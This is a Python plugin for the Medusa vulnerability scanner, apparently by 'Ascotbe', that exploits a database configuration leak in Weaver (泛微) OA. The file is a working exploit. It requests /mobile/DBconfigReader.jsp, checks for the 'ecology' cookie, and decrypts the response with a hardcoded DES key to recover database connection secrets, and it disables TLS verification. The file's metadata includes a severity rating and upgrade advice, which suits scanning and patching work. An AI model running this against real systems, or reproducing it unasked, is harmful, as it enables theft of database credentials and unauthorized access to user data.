#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = 'Ascotbe'
__date__ = '2019/10/13 22:12 PM'
import urllib.parse
import requests
import ClassCongregation
import pyDes
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="0" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date'] = "2019-10-26"  # 插件编辑时间
        self.info['disclosure'] = '2019-10-13'  # 漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "WeaverDatabaseConfigurationInformationLeaked"  # 插件名称
        self.info['name'] ='泛微OA数据库配置信息泄露' #漏洞名称
        self.info['affects'] = "泛微OA"  # 漏洞组件
        self.info['desc_content'] = "攻击者可通过存在漏洞的页面直接获取到数据库配置信息。如果攻击者可直接访问数据库，则可直接获取用户数据，甚至可以直接控制数据库服务器。"  # 漏洞描述
        self.info['rank'] = "中危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "无"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

def medusa(**kwargs)->None:
    url = kwargs.get("Url")  # 获取传入的url参数
    Headers = kwargs.get("Headers")  # 获取传入的头文件
    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
    try:
        payload = "/mobile/DBconfigReader.jsp"
        payload_url = url + payload

        key = '1z2x3c4v5b6n'[0:8]

        Headers['Content-Type']='application/x-www-form-urlencoded'


        s = requests.session()
        resp = s.get(payload_url,headers=Headers, timeout=6,proxies=proxies, verify=False)
        con=resp.text
        dec=resp.content[10:]
        resph= resp.headers.get('Set-Cookie')
        code = resp.status_code
        if code == 200 and resp.headers['Content-Type']=='text/html; charset=UTF-8' and resph.find('ecology') != -1 :
            k = pyDes.des(key, pyDes.ECB, '\0' * 8, pad=None, padmode=pyDes.PAD_PKCS5)
            decs=k.decrypt(dec)
            Medusa = "{} 存在泛微OA_数据库配置信息泄露验证数据:\r\nUrl:{}\r\n返回数据:{}\r\n解密数据:{}".format(url,payload_url,con,decs)
            _t=VulnerabilityInfo(Medusa)
            ClassCongregation.VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
            ClassCongregation.WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ClassCongregation.ErrorHandling().Outlier(e, _)
        _l = ClassCongregation.ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类


